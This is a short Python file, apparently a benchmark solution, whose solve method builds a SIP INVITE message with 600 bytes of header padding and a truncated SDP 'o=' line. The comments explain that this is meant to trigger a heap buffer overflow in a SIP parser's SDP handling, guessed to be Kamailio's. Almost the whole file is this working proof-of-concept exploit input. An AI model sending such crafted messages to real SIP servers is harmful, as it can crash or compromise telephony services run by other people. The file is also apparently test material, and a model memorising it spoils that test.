class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Buffer Overflow in core: parser/sdp (likely Kamailio).
        # The description "code does not check if it is still before the end of the value"
        # suggests a read overflow when parsing a token/value in SDP without verifying buffer boundaries.
        # This typically occurs when a line ends abruptly (EOF) while the parser is scanning for a delimiter.
        
        # We construct a SIP INVITE message with a malformed SDP body.
        # To match the ground-truth length (~873 bytes) and ensure robust triggering,
        # we include padding in the SIP headers and ensure the SDP body ends with the trigger.
        
        headers = [
            b"INVITE sip:service@127.0.0.1:5060 SIP/2.0",
            b"Via: SIP/2.0/UDP 127.0.0.1:5060;branch=z9hG4bK-POC",
            b"From: <sip:tester@127.0.0.1>;tag=12345",
            b"To: <sip:service@127.0.0.1>",
            b"Call-ID: 123456789-POC",
            b"CSeq: 1 INVITE",
            b"Contact: <sip:tester@127.0.0.1>",
            b"Content-Type: application/sdp",
            # Padding to align with the ground truth size context, 
            # though the crash is triggered by the body structure.
            b"X-Padding: " + b"A" * 600
        ]
        
        # The trigger:
        # A valid 'v=' line to start the session.
        # A malformed 'o=' line at the very end of the payload.
        # The parser expects: o=<username> <sess-id> <sess-version> <nettype> <addrtype> <unicast-address>
        # We provide a truncated line. The parser iterates to find the next token/delimiter and runs past EOF.
        # Using a partial IP address or just missing fields is a common trigger for this issue.
        body = b"v=0\r\no=- 123 123 IN IP4 127.0"
        
        # Properly set Content-Length so the parser knows the boundary (which it ignores in the vulnerable loop)
        headers.append(f"Content-Length: {len(body)}".encode())
        
        # Combine headers and body. Ensure no extra newlines after body to keep the trigger at EOF.
        poc = b"\r\n".join(headers) + b"\r\n\r\n" + body
        
        return poc